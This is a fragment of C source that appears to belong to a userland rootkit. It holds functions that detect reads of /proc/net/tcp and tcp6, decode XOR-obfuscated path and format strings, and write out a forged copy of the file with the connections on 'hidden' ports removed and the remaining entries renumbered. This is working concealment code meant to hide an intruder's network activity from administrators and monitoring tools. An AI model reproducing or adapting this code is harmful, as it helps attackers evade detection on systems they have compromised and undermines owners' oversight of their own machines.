int isprocnet(const char *pathname){
    char *pnetpath;
    int s;

    pnetpath = xordup(PNET_PATH);
    if(!pnetpath) return 0;
    s = strcmp(pathname, pnetpath);
    clean(pnetpath);
    if(s == 0) return 1;

    pnetpath = xordup(PNET6_PATH);
    if(!pnetpath) return 0;
    s = strcmp(pathname, pnetpath);
    clean(pnetpath);
    if(s == 0) return 1;

    return 0;
}

procnet_t getaprocnet(const char *buf, char *ft){
    procnet_t ret;
    char *fmt;

    if(ft == NULL)
        fmt = xordup(PNET_FMT);
    else fmt = ft;
    if(!fmt) return ret;

    memset(&ret, 0, sizeof(procnet_t));
    sscanf(buf, fmt, &ret.d, ret.laddr, &ret.lport, ret.raddr, &ret.rport, &ret.state, &ret.txq,
                     &ret.rxq, &ret.t_run, &ret.t_len, &ret.retr, &ret.uid, &ret.tout, &ret.inode,
                     ret.etc);

    if(ft == NULL)
        clean(fmt);
    return ret;
}

FILE *forge_procnet(const char *pathname){
    FILE *tmp, *fp;
    fp = redirstream(pathname, &tmp);
    if(fp == NULL){
        errno = ENOENT;
        return NULL;
    }

    if(!reinitmvbc()){ // reinit this in case hideports has changed.
        fclose(tmp);
        return fp;
    }

    char *fmt = xordup(PNET_FMT);
    if(!fmt){
        fclose(tmp);
        return fp;
    }

    char line[LINE_MAX];
    u_int align = 0;

    // first line is good.
    fgets(line, sizeof(line), fp);
    fprintf(tmp, "%s", line);

    while(fgets(line, sizeof(line), fp) != NULL){
        procnet_t pn = getaprocnet(line, fmt);
        if(!hiddenpn(pn)){
            pn.d = align++;
            int p = procnetprint(pathname, pn, tmp);
            memset(&pn, 0, sizeof(procnet_t));
            if(p < 0){
                fclose(tmp);
                return fp;
            }else fflush(tmp);
        }else memset(&pn, 0, sizeof(procnet_t));
    }
    clean(fmt);
    fclose(fp);
    
    rewind(tmp);
    return tmp;
}
